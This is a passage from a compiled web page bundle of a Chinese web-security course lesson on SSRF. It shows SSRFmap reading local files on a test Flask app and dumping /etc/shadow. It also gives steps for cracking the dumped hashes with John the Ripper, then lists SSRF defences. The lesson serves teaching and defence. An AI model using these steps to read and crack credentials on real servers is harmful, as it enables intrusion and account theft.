<span class="line"><span style="color:#E1E4E8;">python ssrfmap.py </span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;">r data</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">request.txt </span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;">p url </span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;">m readfiles</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">FLASK_APP</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">data</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">example.py flask run </span><span style="color:#D73A49;">&amp;</span></span>
<span class="line"><span style="color:#24292E;">python ssrfmap.py </span><span style="color:#D73A49;">-</span><span style="color:#24292E;">r data</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">request.txt </span><span style="color:#D73A49;">-</span><span style="color:#24292E;">p url </span><span style="color:#D73A49;">-</span><span style="color:#24292E;">m readfiles</span></span></code></pre></div><p>其中 data/request.txt 内容如下：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">POST </span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">ssrf HTTP</span><span style="color:#F97583;">/</span><span style="color:#79B8FF;">1.1</span></span>
<span class="line"><span style="color:#E1E4E8;">Host</span><span style="color:#F97583;">:</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">127.0</span><span style="color:#E1E4E8;">.</span><span style="color:#FDAEB7;font-style:italic;">0</span><span style="color:#E1E4E8;">.</span><span style="color:#FDAEB7;font-style:italic;">1</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">5000</span></span>
<span class="line"><span style="color:#E1E4E8;">User</span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;">Agent</span><span style="color:#F97583;">:</span><span style="color:#E1E4E8;"> Mozilla</span><span style="color:#F97583;">/</span><span style="color:#79B8FF;">5.0</span><span style="color:#E1E4E8;"> (X11; Linux x86_64; rv</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">62.0</span><span style="color:#E1E4E8;">) Gecko</span><span style="color:#F97583;">/</span><span style="color:#79B8FF;">20100101</span><span style="color:#E1E4E8;"> Firefox</span><span style="color:#F97583;">/</span><span style="color:#79B8FF;">62.0</span></span>
<span class="line"><span style="color:#E1E4E8;">Accept</span><span style="color:#F97583;">:</span><span style="color:#E1E4E8;"> text</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">html,application</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">xhtml</span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;">xml,application</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">xml;q</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">0.9</span><span style="color:#E1E4E8;">,</span><span style="color:#F97583;">*</span><span style="color:#6A737D;">/*;q=0.8</span></span>
<span class="line"><span style="color:#6A737D;">Accept-Language: en-US,en;q=0.5</span></span>
<span class="line"><span style="color:#6A737D;">Accept-Encoding: gzip, deflate</span></span>
<span class="line"><span style="color:#6A737D;">Referer: http://mysimple.ssrf/</span></span>
<span class="line"><span style="color:#6A737D;">Content-Type: application/x-www-form-urlencoded</span></span>
<span class="line"><span style="color:#6A737D;">Content-Length: 31</span></span>
<span class="line"><span style="color:#6A737D;">Connection: close</span></span>
<span class="line"><span style="color:#6A737D;">Upgrade-Insecure-Requests: 1</span></span>
<span class="line"><span style="color:#6A737D;">url=https%3A%2F%2Fwww.google.fr%</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">POST </span><span style="color:#D73A49;">/</span><span style="color:#24292E;">ssrf HTTP</span><span style="color:#D73A49;">/</span><span style="color:#005CC5;">1.1</span></span>
<span class="line"><span style="color:#24292E;">Host</span><span style="color:#D73A49;">:</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">127.0</span><span style="color:#24292E;">.</span><span style="color:#B31D28;font-style:italic;">0</span><span style="color:#24292E;">.</span><span style="color:#B31D28;font-style:italic;">1</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">5000</span></span>
<span class="line"><span style="color:#24292E;">User</span><span style="color:#D73A49;">-</span><span style="color:#24292E;">Agent</span><span style="color:#D73A49;">:</span><span style="color:#24292E;"> Mozilla</span><span style="color:#D73A49;">/</span><span style="color:#005CC5;">5.0</span><span style="color:#24292E;"> (X11; Linux x86_64; rv</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">62.0</span><span style="color:#24292E;">) Gecko</span><span style="color:#D73A49;">/</span><span style="color:#005CC5;">20100101</span><span style="color:#24292E;"> Firefox</span><span style="color:#D73A49;">/</span><span style="color:#005CC5;">62.0</span></span>
<span class="line"><span style="color:#24292E;">Accept</span><span style="color:#D73A49;">:</span><span style="color:#24292E;"> text</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">html,application</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">xhtml</span><span style="color:#D73A49;">+</span><span style="color:#24292E;">xml,application</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">xml;q</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">0.9</span><span style="color:#24292E;">,</span><span style="color:#D73A49;">*</span><span style="color:#6A737D;">/*;q=0.8</span></span>
<span class="line"><span style="color:#6A737D;">Accept-Language: en-US,en;q=0.5</span></span>
<span class="line"><span style="color:#6A737D;">Accept-Encoding: gzip, deflate</span></span>
<span class="line"><span style="color:#6A737D;">Referer: http://mysimple.ssrf/</span></span>
<span class="line"><span style="color:#6A737D;">Content-Type: application/x-www-form-urlencoded</span></span>
<span class="line"><span style="color:#6A737D;">Content-Length: 31</span></span>
<span class="line"><span style="color:#6A737D;">Connection: close</span></span>
<span class="line"><span style="color:#6A737D;">Upgrade-Insecure-Requests: 1</span></span>
<span class="line"><span style="color:#6A737D;">url=https%3A%2F%2Fwww.google.fr%</span></span></code></pre></div><p>它会读取很多敏感文件，比如 /etc/passwd、/etc/hosts：</p>`,6),U=p(`<p>图 13：利用 SSRFmap 读取本地文件</p><p>以上我们测试了，然后读取了敏感文件，然后好像就戛然而止了，读取之后就没有下文了。比如你想破解主机密码，就可以读取文件 /etc/shadow 以获得用户名和密码密文，然后就可以用 john 去破解密码：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">$ sudo cat </span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">etc</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">shadow</span></span>
<span class="line"><span style="color:#E1E4E8;">root</span><span style="color:#F97583;">:</span><span style="color:#E1E4E8;">$6$TBFgG</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">seGvOG8nOp$LvZXXXXXXXENV2F6SEATplyE1QY33W2buEs10XLi.zQD8iwl.kCwsD.OMQ6WWkmUdu</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">9RPLHvLYSzMfcLj0</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">18446</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">0</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">99999</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">7</span><span style="color:#F97583;">:::</span></span>
<span class="line"><span style="color:#E1E4E8;">daemon</span><span style="color:#F97583;">:*:</span><span style="color:#79B8FF;">18375</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">0</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">99999</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">7</span><span style="color:#F97583;">:::</span></span>
<span class="line"><span style="color:#E1E4E8;">bin</span><span style="color:#F97583;">:*:</span><span style="color:#79B8FF;">18375</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">0</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">99999</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">7</span><span style="color:#F97583;">:::</span></span>
<span class="line"><span style="color:#E1E4E8;">sys</span><span style="color:#F97583;">:*:</span><span style="color:#79B8FF;">18375</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">0</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">99999</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">7</span><span style="color:#F97583;">:::</span></span>
<span class="line"><span style="color:#E1E4E8;">......</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">$ sudo cat </span><span style="color:#D73A49;">/</span><span style="color:#24292E;">etc</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">shadow</span></span>
<span class="line"><span style="color:#24292E;">root</span><span style="color:#D73A49;">:</span><span style="color:#24292E;">$6$TBFgG</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">seGvOG8nOp$LvZXXXXXXXENV2F6SEATplyE1QY33W2buEs10XLi.zQD8iwl.kCwsD.OMQ6WWkmUdu</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">9RPLHvLYSzMfcLj0</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">18446</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">0</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">99999</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">7</span><span style="color:#D73A49;">:::</span></span>
<span class="line"><span style="color:#24292E;">daemon</span><span style="color:#D73A49;">:*:</span><span style="color:#005CC5;">18375</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">0</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">99999</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">7</span><span style="color:#D73A49;">:::</span></span>
<span class="line"><span style="color:#24292E;">bin</span><span style="color:#D73A49;">:*:</span><span style="color:#005CC5;">18375</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">0</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">99999</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">7</span><span style="color:#D73A49;">:::</span></span>
<span class="line"><span style="color:#24292E;">sys</span><span style="color:#D73A49;">:*:</span><span style="color:#005CC5;">18375</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">0</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">99999</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">7</span><span style="color:#D73A49;">:::</span></span>
<span class="line"><span style="color:#24292E;">......</span></span></code></pre></div><p>加密的密码具有固定格式：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">$id$salt$encrypted</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">$id$salt$encrypted</span></span></code></pre></div><ul><li><p>id：表示加密算法，1 代表 MD5，5 代表 SHA-256，6 代表 SHA-512。</p></li><li><p>salt：表示密码学中的 Salt，由系统随机生成 。</p></li><li><p>encrypted：表示密码的 hash。</p></li></ul><p>冒号后面的数值是一些日期和密码修改间隔天数的信息，可以不用管，以上述示例中 root 账号为例：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">root</span><span style="color:#F97583;">:</span><span style="color:#E1E4E8;">$6$TBFgG</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">seGvOG8nOp$LvZXXXXXXXENV2F6SEATplyE1QY33W2buEs10XLi.zQD8iwl.kCwsD.OMQ6WWkmUdu</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">9RPLHvLYSzMfcLj0</span></span>
<span class="line"><span style="color:#E1E4E8;">id</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">6</span><span style="color:#E1E4E8;">，即使用SHA</span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;">512哈希算法</span></span>
<span class="line"><span style="color:#E1E4E8;">salt</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">TBFgG</span></span>
<span class="line"><span style="color:#E1E4E8;">encrypted</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">seGvOG8nOp$LvZXXXXXXXENV2F6SEATplyE1QY33W2buEs10XLi.zQD8iwl.kCwsD.OMQ6WWkmUdu</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">9RPLHvLYSzMfcLj0</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">root</span><span style="color:#D73A49;">:</span><span style="color:#24292E;">$6$TBFgG</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">seGvOG8nOp$LvZXXXXXXXENV2F6SEATplyE1QY33W2buEs10XLi.zQD8iwl.kCwsD.OMQ6WWkmUdu</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">9RPLHvLYSzMfcLj0</span></span>
<span class="line"><span style="color:#24292E;">id</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">6</span><span style="color:#24292E;">，即使用SHA</span><span style="color:#D73A49;">-</span><span style="color:#24292E;">512哈希算法</span></span>
<span class="line"><span style="color:#24292E;">salt</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">TBFgG</span></span>
<span class="line"><span style="color:#24292E;">encrypted</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">seGvOG8nOp$LvZXXXXXXXENV2F6SEATplyE1QY33W2buEs10XLi.zQD8iwl.kCwsD.OMQ6WWkmUdu</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">9RPLHvLYSzMfcLj0</span></span></code></pre></div><p>接下来我们可以直接使用 john 去破解 shadow 文件：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;"># 安装John the Ripper</span></span>
<span class="line"><span style="color:#E1E4E8;">$ sudo apt install john </span></span>
<span class="line"><span style="color:#E1E4E8;">$ john</span></span>
<span class="line"><span style="color:#E1E4E8;">John the Ripper password cracker, version </span><span style="color:#79B8FF;">1.8</span><span style="color:#E1E4E8;">.</span><span style="color:#FDAEB7;font-style:italic;">0</span></span>
<span class="line"><span style="color:#B392F0;">Copyright</span><span style="color:#E1E4E8;"> (c) </span><span style="color:#79B8FF;">1996</span><span style="color:#F97583;">-</span><span style="color:#79B8FF;">2013</span><span style="color:#E1E4E8;"> by Solar Designer</span></span>
<span class="line"><span style="color:#E1E4E8;">......</span></span>
<span class="line"><span style="color:#E1E4E8;"># 暴力破解获取的shadow文件中的账号密码</span></span>
<span class="line"><span style="color:#E1E4E8;">$ sudo john .</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">shadow</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;"># 安装John the Ripper</span></span>
<span class="line"><span style="color:#24292E;">$ sudo apt install john </span></span>
<span class="line"><span style="color:#24292E;">$ john</span></span>
<span class="line"><span style="color:#24292E;">John the Ripper password cracker, version </span><span style="color:#005CC5;">1.8</span><span style="color:#24292E;">.</span><span style="color:#B31D28;font-style:italic;">0</span></span>
<span class="line"><span style="color:#6F42C1;">Copyright</span><span style="color:#24292E;"> (c) </span><span style="color:#005CC5;">1996</span><span style="color:#D73A49;">-</span><span style="color:#005CC5;">2013</span><span style="color:#24292E;"> by Solar Designer</span></span>
<span class="line"><span style="color:#24292E;">......</span></span>
<span class="line"><span style="color:#24292E;"># 暴力破解获取的shadow文件中的账号密码</span></span>
<span class="line"><span style="color:#24292E;">$ sudo john .</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">shadow</span></span></code></pre></div><p>之后就是时间的等待，暴力破解有时看运气了，运气好的话我们就拿到服务器的登录账号和密码了。</p><p>SSRFmap 会有一些问题，比如 Pikachu 靶场中的 SSRF（curl）题目就没利用成功，而且 portscan 利用模块开启后就死循环，停不下来。这些都是工具的 Bug，在测试时我们不能完全依赖工具，还是得自己多手工验证。</p><h3 id="ssrf-漏洞防御" tabindex="-1">SSRF 漏洞防御 <a class="header-anchor" href="#ssrf-漏洞防御" aria-label="Permalink to &quot;SSRF 漏洞防御&quot;">​</a></h3><p>有时基于业务功能需要，无法完全限制对外网络请求的功能，这就一定要依据业务场景做一些灵活的变通，不可一刀切。</p><p>这里介绍一些常用的 SSRF 防御方法：</p><ul><li><p>采用白名单限制，只允许访问特定的 IP 或域名，比如只允许访问拉勾网域名 *.lagou.com；</p></li><li><p>限制内网 IP 访问，常见的内网 IP 段有 10.0.0.0 - 10.255.255.255、172.16.0.0 - 172.31.255.255、192.168.0.0 - 192.168.255.255；</p></li><li><p>禁用一些不必要的协议，比如 file://、gopher://、dict://。</p></li></ul><p>另外关闭错误回显、关闭高危端口、及时修复漏洞，哪怕它是处于内网环境，都有助于缓解 SSRF 漏洞的进一步利用。</p><h3 id="总结" tabindex="-1">总结 <a class="header-anchor" href="#总结" aria-label="Permalink to &quot;总结&quot;">​</a></h3><p>这一讲我主要介绍了 SSRF 漏洞的产生原理和危害，然后介绍了利用与绕过网站限制的一些方法，最后介绍了 SSRF 漏洞挖掘与防御方法。</p><p>从 SSRF 名字来看，很容易令人感觉这没有什么危害，甚至有些企业、政府金融机构也认为有些网络请求是正常功能，因此觉得 SSRF 不算漏洞。</p><p>Facebook 曾为一个 SSRF 漏洞支付过 31500 美金，相当于 20 万人民币的奖励。同时，在 2017 年 Orange Tsai 分享的议题&quot;<a href="https://gsec.hitb.org/sg2017/sessions/a-new-era-of-ssrf-exploiting-url-parsers-in-trending-programming-languages/" target="_blank" rel="noreferrer">A New Era of SSRF -- Exploiting URL Parsers in Trending Programming Languages</a>&quot;，演示了利用 SSRF 漏洞实现 Github 远程代码执行的攻击方法。GitHub 为此奖励了 12500 美金，该技术在当年的&quot;<a href="https://portswigger.net/research/top-10-web-hacking-techniques-of-2017" target="_blank" rel="noreferrer">Top 10 Web Hacking Techniques of 2017</a>&quot;评选中获得第一名。这些都表明了 SSRF 的危害，以及一些国际大厂对 SSRF 漏洞的重视。</p><p>最近有位国外安全研究员在 Twitter 上公开了一张 SSRF 漏洞的挖掘、利用、绕过技术的总结图，这里推荐给你。</p>`,22),j=s("p",null,"图 14：SSRF Search & Destory",-1),M=s("p",null,[a("最后我要推荐一篇文章"),s("a",{href:"https://www.sohu.com/a/440098632_99907709",target:"_blank",rel:"noreferrer"},"《SSRF 引发的血案》"),a("，通过信息收集、SSRF 漏洞、旁站路径泄露，最终获取目标网站的 root shell。这篇文章很有实战参考意义，既体现出了信息收集的重要性，又表明了 SSRF 的危害。")],-1),O=s("p",null,"在 SSRF 漏洞的检测和防御中，如果你遇到了什么问题，欢迎在评论区留言。",-1),H=s("p",null,"下一讲，我将带你了解 XXE 漏洞，它是一种帮助计算机理解信息符号并处理各种信息的语言，主要用来传递结构化的数据信息。",-1);function G(V,W,Q,z,Y,Z){const n=e("Image");return t(),r("div",null,[i,y,E,h,d,F,g,l(n,{alt:"图片1.png",src:"https://s0.lgstatic.com/i/image2/M01/05/7E/CgpVE2AADgaALnqEAAU0JhFZzR0654.png"}),a(),u,l(n,{alt:"Drawing 1.png",src:"https://s0.lgstatic.com/i/image/M00/8D/8C/Ciqc1F___H-AGVMFAACkzV98r_I798.png"}),a(),_,l(n,{alt:"图片3.png",src:"https://s0.lgstatic.com/i/image2/M01/05/7C/Cip5yGAADhCAWSnNAAdaKZQ9ykM424.png"}),a(),S,l(n,{alt:"图片4.png",src:"https://s0.lgstatic.com/i/image/M00/8D/9D/CgqCHmAADh6AFbrRAAIMts5NwrM049.png"}),a(),A,C,D,b,l(n,{alt:"Drawing 4.png",src:"https://s0.lgstatic.com/i/image/M00/8D/8C/Ciqc1F___JyAXxb8AAFuJktUmQY503.png"}),a(),f,l(n,{alt:"图片6.png",src:"https://s0.lgstatic.com/i/image/M00/8D/9D/CgqCHmAADkGAIcZZAAMGZOUjpvY507.png"}),a(),R,l(n,{alt:"Drawing 6.png",src:"https://s0.lgstatic.com/i/image/M00/8D/8C/Ciqc1F___M6AM-F0AAB4EJZT7Og734.png"}),a(),m,v,l(n,{alt:"Drawing 7.png",src:"https://s0.lgstatic.com/i/image/M00/8D/8C/Ciqc1F___NaAO7ZxAABr-AfFp10030.png"}),a(),k,T,B,l(n,{alt:"图片9.png",src:"https://s0.lgstatic.com/i/image2/M01/05/7C/Cip5yGAADl-ANvjXAALr6lgnhiU452.png"}),a(),P,l(n,{alt:"Drawing 9.png",src:"https://s0.lgstatic.com/i/image/M00/8D/8C/Ciqc1F___OaARRUKAAA1N0CwrBA260.png"}),a(),L,l(n,{alt:"Drawing 10.png",src:"https://s0.lgstatic.com/i/image/M00/8D/8C/Ciqc1F___PCAJA70AABnCpr9zFk818.png"}),a(),x,q,w,X,$,I,l(n,{alt:"Drawing 11.png",src:"https://s0.lgstatic.com/i/image/M00/8D/8C/Ciqc1F___PiASgPlAAEZ_x3Bz0k961.png"}),a(),N,l(n,{alt:"Drawing 12.png",src:"https://s0.lgstatic.com/i/image/M00/8D/98/CgqCHl___QOAXop9AAFeL92aWyk084.png"}),a(),U,l(n,{alt:"图片14.png",src:"https://s0.lgstatic.com/i/image/M00/8D/9D/CgqCHmAADwWABCT2AAiRZWxBE54491.png"}),a(),j,M,O,H,l(n,{alt:"web安全10金句.png",src:"https://s0.lgstatic.com/i/image/M00/8D/9D/CgqCHmAADyOAB9URAAVCqo4Bquk815.png"})])}const ss=o(c,[["render",G]]);export{K as __pageData,ss as default};
